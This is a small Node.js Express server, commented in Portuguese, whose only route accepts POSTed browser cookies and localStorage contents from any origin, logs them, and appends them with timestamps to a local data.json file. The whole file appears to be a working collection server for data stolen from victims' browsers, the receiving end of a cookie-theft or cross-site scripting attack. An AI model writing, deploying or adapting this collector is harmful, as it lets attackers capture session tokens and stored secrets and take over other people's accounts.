const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const port = 3000;

// Habilitar CORS para permitir requisições de qualquer origem
app.use(cors()); // Aqui você permite o acesso de qualquer origem

// Middleware para parsear o corpo da requisição como JSON
app.use(bodyParser.json());

// Rota para receber os cookies e localStorage do cliente
app.post('/', (req, res) => {
  const { cookies, localStorage } = req.body;
  console.log(cookies);
  console.log(localStorage);
  // Verificando se os dados foram recebidos
  if (!cookies || !localStorage) {
    return res
      .status(400)
      .json({ error: 'Cookies ou localStorage não fornecidos' });
  }

  // Gerando o caminho do arquivo onde os dados serão salvos
  const filePath = path.join(__dirname, 'data.json');

  // Objeto com os dados para salvar
  const data = {
    cookies: cookies,
    localStorage: localStorage,
    timestamp: new Date().toISOString(),
  };

  // Salvando os dados no arquivo
  fs.appendFile(filePath, JSON.stringify(data, null, 2) + ',\n', (err) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao salvar os dados' });
    }

    res.status(200).json({ message: 'Dados salvos com sucesso!' });
  });
});

// Iniciando o servidor
app.listen(port, () => {
  console.log(`Servidor Express rodando na porta ${port}`);
});
